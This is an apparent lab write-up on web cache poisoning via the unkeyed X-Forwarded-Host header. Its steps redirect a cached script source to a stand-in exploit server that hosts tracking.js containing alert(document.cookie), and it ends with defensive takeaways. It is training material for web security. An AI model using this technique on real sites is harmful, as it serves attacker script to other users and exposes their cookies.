# Lab: Web cache poisoning with an unkeyed header

## Description
This lab contains a web cache poisoning vulnerability. The application uses an unkeyed header to generate a response that is then cached and served to other users.

## Analysis
A "keyed" part of the request (like the URL) determines if a cached response should be served. An "unkeyed" part (like certain headers) does not. If an unkeyed header affects the response content, we can poison the cache by sending a malicious header value.

In this lab, the `X-Forwarded-Host` header is unkeyed and used to generate the source for a script.

```html
<script src="https://[X-Forwarded-Host]/resources/js/tracking.js"></script>
```

## Exploitation
I need to poison the cache so that users load a script from my exploit server.

### Steps
1. Navigate to the homepage and observe the `X-Forwarded-Host` header in the request.
2. Use Burp Repeater to send a request with a custom `X-Forwarded-Host`:
   `X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
3. Check the response. If the script URL now points to your exploit server, the application is vulnerable.
4. On your exploit server, create a file at `/resources/js/tracking.js` with the content `alert(document.cookie)`.
5. Keep sending the request until you see `X-Cache: hit` in the response. This means the poisoned response is now in the cache.
6. Any user who visits the homepage while the cache is poisoned will execute your script.

## Payload
```text
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

## Takeaways
- Web cache poisoning can turn a self-XSS or other minor vulnerability into a significant attack affecting multiple users.
- Review your cache configuration and ensure that all headers used to generate a response are included in the cache key.
- Avoid using headers like `X-Forwarded-Host` to generate URLs in your application.
